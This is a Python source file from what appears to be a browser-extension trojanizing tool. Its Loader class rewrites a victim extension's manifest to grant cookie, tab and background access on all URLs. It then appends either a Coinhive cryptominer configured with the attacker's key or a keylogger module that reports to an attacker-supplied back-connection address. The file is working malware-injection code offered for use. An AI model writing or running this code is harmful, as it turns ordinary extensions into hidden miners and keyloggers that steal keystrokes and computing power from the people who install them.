#!/usr/bin/python

import json
import os
from libs.colors import Colors

class Loader :

	def __init__(self, extension, module) :

		self.module = module
		self.extension = extension
		self.color = Colors()
		
	def inject(self) :

		try:

			permissions = ["background", "cookies", "activeTab", "tabs", "*://*/*"]
			
			manifest = "output/extensions/{}/manifest.json".format(self.extension)

			path = ""

			with open(manifest, "r") as f :

				f = f.read() # Read the manifest
				parse = json.loads(f) # Parse to json object

				permit = parse['permissions']
				scripts = parse['content_scripts'][0]

				for e, permission in enumerate(permissions) :
					if not permission in permit:
						 permit.append(permission)
				for e, content in enumerate(scripts) :
					if "matches" in content:
						rexp = scripts[content][0]
						if not rexp == "*://*/*":
							scripts[content].append("*://*/*")
					if "js" in content :
						path += scripts[content][0]

				with open(manifest, "wb") as w :
					w.write(json.dumps(parse, indent=2, sort_keys=True, separators=(',', ': '), ensure_ascii=False))
					w.close()

			if self.module == "currency":

				modules = "modules/currency/coinhive/coinhive.js" # Javascript file to inject into background

				print("{} Configuration of module {}".format(self.color.yellows("[!]"), modules))

				apikey = raw_input("{} Set coinhive public key: ".format(self.color.status("[+]")))
				thread = raw_input("{} Set coinhive threads: ".format(self.color.status("[+]")))
				autoThreads = raw_input("{} Set coinhive autoThreads: ".format(self.color.status("[+]")))
				throttle = raw_input("{} Set coinhive throttle: ".format(self.color.status("[+]")))
				forceASMJS = raw_input("{} Set coinhive forceASMJS: ".format(self.color.status("[+]")))

				options = "{}{}{}, {}thread:{}, autoThreads:{}, throttle: {}, forceASMJS: {}{}".format('"',apikey,'"',"{",thread, autoThreads, throttle, forceASMJS,"}") # Options

			elif self.module == "keylogger" :

				modules = "modules/keylogger/keylogger.js" # Javascript file to inject into background
				print("{} Configuration of module {}".format(self.color.yellows("[!]"), modules))
				connection = raw_input("{} Set the back connection: ".format("[+]"))
				options = "{}".format(connection)
				
			with open(modules, "r") as payload :
				payload = payload.read()
				payload = payload.replace("_0xacfd[2]", str(options))
				with open("output/extensions/{}/{}".format(self.extension, path ), "a") as s :
					s.write(payload)
					print("{} Module as been injected {}".format(self.color.status("[!]"), modules))
					s.close()
		except IOError as e:
			raise e
